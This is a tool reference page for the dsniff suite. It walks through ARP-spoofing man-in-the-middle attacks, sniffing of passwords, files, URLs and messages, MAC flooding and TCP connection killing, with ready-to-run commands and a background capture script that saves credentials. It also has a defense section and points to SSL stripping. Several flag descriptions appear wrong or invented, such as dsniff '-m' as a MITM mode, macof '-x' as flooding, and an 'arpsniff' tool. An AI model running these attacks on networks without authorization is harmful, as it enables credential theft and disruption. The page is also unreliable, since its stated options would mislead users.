---
title: "dsniff - Network Audit and Penetration Testing Suite"
description: "Collection of network auditing and penetration testing tools for sniffing passwords and performing man-in-the-middle attacks on LAN environments"
mitre_tactic: discovery
mitre_tactic_id: TA0007
mitre_subcategory: network_sniffing
categories:
  - network-security
  - penetration-testing
  - password-sniffing
  - man-in-the-middle
  - packet-analysis
tags:
  - dsniff
  - arpspoof
  - filesnarf
  - urlsnarf
  - msgsnarf
  - macof
  - tcpkill
  - network-audit
  - credential-capture
install_command: "sudo apt install dsniff"
version: "2.3"
github_repo: ""
kali_tools_page: "https://www.kali.org/tools/dsniff/"
difficulty_level: intermediate
requires_root: true
gui_available: false
related_tools:
  - ettercap
  - tcpdump
  - wireshark
  - arpspoof
  - bettercap
---

# dsniff - Network Audit and Penetration Testing Suite

## 1. Introduction

dsniff is a collection of network auditing and penetration testing tools designed for sniffing insecure network passwords and performing man-in-the-middle attacks on local area networks. Developed by Dug Song, this suite includes multiple specialized tools that target different protocols and attack vectors.

**Primary Use Cases:**
- Password sniffing on HTTP, Telnet, FTP, POP, IMAP, and AIM protocols
- ARP spoofing for man-in-the-middle attacks
- Network traffic capture and analysis
- Packet injection and denial-of-service testing
- File extraction from network streams
- URL and message capture

**Tool Suite Components:**
- **dsniff**: Main password sniffer for multiple protocols
- **arpspoof**: ARP cache poisoning tool
- **filesnarf**: Extracts files from network traffic
- **urlsnarf**: Captures HTTP requests and URLs
- **msgsnarf**: Captures instant messages (AIM, IRC, etc.)
- **macof**: MAC address flooding tool
- **tcpkill**: TCP connection killer
- **tcpnice**: TCP connection slow-down tool

**Network Requirements:**
- Linux-based operating system
- Network interface with promiscuous mode support
- Root or sudo privileges
- Target network must be on the same broadcast domain (for ARP-based attacks)

## 2. Installation

### Standard Installation

```bash
# Install dsniff suite
sudo apt update
sudo apt install dsniff

# Verify installation
dsniff -h
arpspoof -h
```

### Installation from Source

```bash
# Install dependencies
sudo apt install libpcap-dev libnet1-dev libssl-dev

# Clone repository
git clone https://github.com/dugsong/dsniff.git
cd dsniff

# Build and install
./configure
make
sudo make install
```

### Verify Installation

```bash
# Check all tools are installed
which dsniff arpspoof filesnarf urlsnarf msgsnarf macof tcpkill tcpnice

# Check version
dpkg -l | grep dsniff
```

## 3. Core Concepts

### ARP Spoofing

ARP (Address Resolution Protocol) spoofing is the foundation of many man-in-the-middle attacks. The attacker sends fake ARP messages to associate their MAC address with the IP address of another host (typically the default gateway).

**Attack Flow:**
1. Attacker sends forged ARP replies to victim
2. Victim's ARP cache is poisoned
3. Traffic destined for gateway flows through attacker
4. Attacker captures and analyzes traffic

### Protocol Sniffing

dsniff understands multiple application-layer protocols and can extract credentials and data from:
- **HTTP**: Basic authentication, form submissions
- **Telnet**: Username and password pairs
- **FTP**: File transfer credentials
- **POP3/IMAP**: Email credentials
- **AIM**: Instant message content

### Network Positioning

For successful sniffing, the attacker must be positioned correctly:
- **Hub-based networks**: Promiscuous mode sufficient
- **Switch-based networks**: ARP spoofing required
- **Wireless networks**: Monitor mode or promiscuous mode

## 4. Command Reference

### dsniff (Password Sniffer)

```bash
# Basic syntax
dsniff [options] [filter expression]

# Flags
-i <interface>          # Specify network interface
-f <pcapfile>           # Read from pcap file
-n                      # Don't resolve hostnames
-p <port>               # Specify port to listen on
-v                      # Verbose output
-m                      # Enable MITM mode (with arpspoof)
-d                      # Enable debug mode
-s <length>             # Snap length (bytes to capture)
```

### arpspoof

```bash
# Basic syntax
arpspoof [-i interface] [-t target] host

# Flags
-i <interface>          # Network interface
-t <target>             # Target host
-r                      # Poison both directions (target and host)
```

### filesnarf

```bash
# Basic syntax
filesnarf [options] [filter expression]

# Flags
-i <interface>          # Network interface
-n                      # Don't resolve hostnames
-v                      # Verbose output
```

### urlsnarf

```bash
# Basic syntax
urlsnarf [options] [filter expression]

# Flags
-i <interface>          # Network interface
-n                      # Don't resolve hostnames
-p <port>               # Listen on specific port
-v                      # Verbose output
```

### msgsnarf

```bash
# Basic syntax
msgsnarf [options] [filter expression]

# Flags
-i <interface>          # Network interface
-n                      # Don't resolve hostnames
-v                      # Verbose output
```

### macof

```bash
# Basic syntax
macof [options]

# Flags
-i <interface>          # Network interface
-s <source>             # Source MAC address
-d <destination>        # Destination MAC address
-p <port>               # Destination port
-x                      # Flood the network
```

### tcpkill

```bash
# Basic syntax
tcpkill [options] [expression]

# Flags
-i <interface>          # Network interface
-c <count>              # Number of connections to kill
-v                      # Verbose output
```

### tcpnice

```bash
# Basic syntax
tcpnice [options] [expression]

# Flags
-i <interface>          # Network interface
-v                      # Verbose output
```

## 5. Examples

### Basic Examples

```bash
# Sniff passwords on eth0
sudo dsniff -i eth0

# Sniff with hostname resolution disabled
sudo dsniff -i eth0 -n

# Capture HTTP URLs
sudo urlsnarf -i eth0

# Capture files from network
sudo filesnarf -i eth0

# Capture instant messages
sudo msgsnarf -i eth0
```

### Intermediate Examples

```bash
# ARP spoof target machine
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# ARP spoof both directions
sudo arpspoof -i eth0 -t 192.168.1.100 -r 192.168.1.1

# Sniff specific subnet
sudo dsniff -i eth0 'net 192.168.1.0/24'

# Capture FTP credentials
sudo dsniff -i eth0 'port 21'

# Flood network with ARP requests
sudo macof -i eth0 -x

# Kill specific TCP connection
sudo tcpkill -i eth0 'host 192.168.1.100 and port 80'
```

### Advanced Examples

```bash
# Complete MITM attack sequence
# Step 1: Enable IP forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward

# Step 2: ARP spoof target
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &

# Step 3: Sniff credentials
sudo dsniff -i eth0 -n &

# Step 4: Capture files
sudo filesnarf -i eth0 &

# Step 5: Capture URLs
sudo urlsnarf -i eth0 &

# Read from pcap file
dsniff -f capture.pcap

# Sniff with BPF filter
sudo dsniff -i eth0 'tcp port 80 or tcp port 443'

# Slow down TCP connections
sudo tcpnice -i eth0 'host 192.168.1.100'
```

### Real-World Scenarios

```bash
# Corporate network audit
sudo dsniff -i eth0 -n -v 'not arp'

# Web application testing
sudo urlsnarf -i eth0 'tcp port 80'

# File server monitoring
sudo filesnarf -i eth0 'tcp port 21 or tcp port 445'

# Email credential capture
sudo dsniff -i eth0 'port 110 or port 143 or port 993 or port 995'

# VoIP monitoring
sudo dsniff -i eth0 'udp port 5060'

# Wireless network audit
sudo dsniff -i wlan0mon -n
```

## 6. Advanced Usage

### Custom BPF Filters

```bash
# Sniff specific host
sudo dsniff -i eth0 'host 192.168.1.100'

# Sniff specific subnet
sudo dsniff -i eth0 'net 192.168.1.0/24'

# Sniff specific port range
sudo dsniff -i eth0 'portrange 8000-9000'

# Exclude specific host
sudo dsniff -i eth0 'not host 192.168.1.1'

# Complex filter
sudo dsniff -i eth0 '(tcp port 80 or tcp port 443) and host 192.168.1.100'
```

### Scripting and Automation

```bash
#!/bin/bash
# Automated network audit script

INTERFACE="eth0"
TARGET_SUBNET="192.168.1.0/24"
OUTPUT_DIR="/tmp/dsniff_audit"

mkdir -p $OUTPUT_DIR

# Start sniffing in background
sudo dsniff -i $INTERFACE -n -v > $OUTPUT_DIR/credentials.txt 2>&1 &
DSNIFF_PID=$!

# Capture URLs
sudo urlsnarf -i $INTERFACE > $OUTPUT_DIR/urls.txt 2>&1 &
URLSNARF_PID=$!

# Capture files
sudo filesnarf -i $INTERFACE -o $OUTPUT_DIR/files &
FILESNARF_PID=$!

# Wait for user interrupt
echo "Sniffing started. Press Ctrl+C to stop."
trap "kill $DSNIFF_PID $URLSNARF_PID $FILESNARF_PID; exit" SIGINT
wait
```

### Integration with Other Tools

```bash
# Pipe dsniff output to file
sudo dsniff -i eth0 -n 2>&1 | tee audit_log.txt

# Use with tmux for long-running sessions
tmux new-session -d -s dsniff 'sudo dsniff -i eth0 -n'
tmux attach -t dsniff

# Log to syslog
sudo dsniff -i eth0 -n 2>&1 | logger -t dsniff

# Process with grep
sudo dsniff -i eth0 -n | grep -i "password"
```

## 7. Detection & Defense

### Detection Methods

**ARP Cache Inspection:**
```bash
# Check for duplicate MAC addresses
arp -a | awk '{print $2, $4}' | sort | uniq -d

# Monitor ARP table changes
watch -n 2 'arp -a'

# Use arping to verify hosts
sudo arping -I eth0 192.168.1.1
```

**Network Monitoring:**
```bash
# Detect ARP spoofing with arpsniff
sudo arpsniff -i eth0

# Monitor for excessive ARP traffic
sudo tcpdump -i eth0 arp -n

# Check for promiscuous mode interfaces
cat /sys/class/net/eth0/flags
```

**IDS Signatures:**
- Snort rules for ARP spoofing detection
- Suricata rules for credential sniffing
- Zeek (Bro) scripts for protocol analysis

### Defense Strategies

**Static ARP Entries:**
```bash
# Add static ARP entry for gateway
sudo arp -s 192.168.1.1 00:11:22:33:44:55

# Persist static ARP entries
sudo nano /etc/ethers
```

**ARP Inspection:**
```bash
# Enable ARP inspection on switches (Cisco example)
# switch(config)# ip arp inspection vlan 10
# switch(config)# ip arp inspection validate src-mac dst-mac ip

# Use Dynamic ARP Inspection (DAI)
# switch(config-if)# ip arp inspection trust
```

**Network Segmentation:**
- Implement VLANs to limit broadcast domains
- Use private VLANs for sensitive segments
- Deploy network access control (NAC)

**Encryption:**
- Use SSH instead of Telnet
- Use HTTPS instead of HTTP
- Implement VPN for remote access
- Use encrypted protocols for email (IMAPS, POP3S)

**Host-Based Defense:**
```bash
# Install ARP monitoring tool
sudo apt install arpsniff

# Enable arpwatch
sudo apt install arpwatch
sudo systemctl enable arpwatch
sudo systemctl start arpwatch
```

## 8. Troubleshooting & FAQ

### Common Issues

**"No such device" Error:**
```bash
# List available interfaces
ip link show

# Check interface status
sudo ip link set eth0 up

# Verify interface supports promiscuous mode
sudo ip link set eth0 promisc on
```

**"Permission Denied" Error:**
```bash
# Run with sudo
sudo dsniff -i eth0

# Or run as root
su -
dsniff -i eth0
```

**No Packets Captured:**
```bash
# Verify interface is in promiscuous mode
ip link show eth0 | grep -i promisc

# Check BPF filter
sudo dsniff -i eth0 -v

# Test with tcpdump
sudo tcpdump -i eth0 -c 10
```

**ARP Spoofing Not Working:**
```bash
# Verify IP forwarding is enabled
cat /proc/sys/net/ipv4/ip_forward

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Check for ARP protection
arp -a | grep gateway
```

### Performance Issues

**High CPU Usage:**
```bash
# Reduce snap length
sudo dsniff -i eth0 -s 96

# Use more specific filters
sudo dsniff -i eth0 'tcp port 80'

# Limit capture count
sudo tcpdump -i eth0 -c 1000 -w capture.pcap
```

**Packet Loss:**
```bash
# Increase buffer size
sudo dsniff -i eth0 -B 4096

# Use faster interface
sudo dsniff -i eth1  # Use 1Gbps interface

# Reduce system load
sudo systemctl stop [unnecessary-services]
```

### FAQ

**Q: Can dsniff capture HTTPS traffic?**
A: dsniff cannot decrypt HTTPS traffic. It can capture the encrypted packets but cannot extract credentials. Use SSL stripping or certificate spoofing techniques instead.

**Q: Does dsniff work on switched networks?**
A: Yes, when combined with ARP spoofing (arpspoof). The tool needs to position itself as a man-in-the-middle.

**Q: Can dsniff capture traffic from other VLANs?**
A: No, dsniff operates at Layer 2 and cannot cross VLAN boundaries without additional routing or switching configurations.

**Q: Is dsniff legal to use?**
A: Only on networks you own or have explicit authorization to test. Unauthorized use is illegal and unethical.

**Q: How does dsniff differ from Wireshark?**
A: dsniff is specialized for credential capture and MITM attacks, while Wireshark is a general-purpose protocol analyzer with GUI support.

**Q: Can dsniff capture wireless traffic?**
A: Yes, but the wireless interface must be in monitor mode and configured properly for packet capture.

## Resources

### Official Documentation
- [dsniff Manual Page](https://linux.die.net/man/8/dsniff)
- [Kali Linux dsniff Documentation](https://www.kali.org/tools/dsniff/)
- [dsniff GitHub Repository](https://github.com/dugsong/dsniff)

### Tutorials and Guides
- [Hacking Secret Network Passwords with dsniff](https://www.youtube.com/watch?v=dSnMFkMqN3E)
- [ARP Spoofing with dsniff](https://www.tutorialspoint.com/dsniff/index.htm)
- [Network Penetration Testing with dsniff](https://www.offensive-security.com)

### Related Tools
- **ettercap**: Comprehensive MITM suite
- **tcpdump**: Command-line packet analyzer
- **wireshark**: GUI protocol analyzer
- **bettercap**: Modern MITM framework
- **arpspoof**: Standalone ARP spoofing tool

### Books and Resources
- *Network Security Assessment* by Chris McNab
- *Hacking: The Art of Exploitation* by Jon Erickson
- *Metasploit: The Penetration Tester's Guide* by David Kennedy

### Community
- [Kali Linux Forums](https://forums.kali.org/)
- [Offensive Security Forums](https://forums.offensive-security.com/)
- [Reddit r/netsec](https://www.reddit.com/r/netsec/)
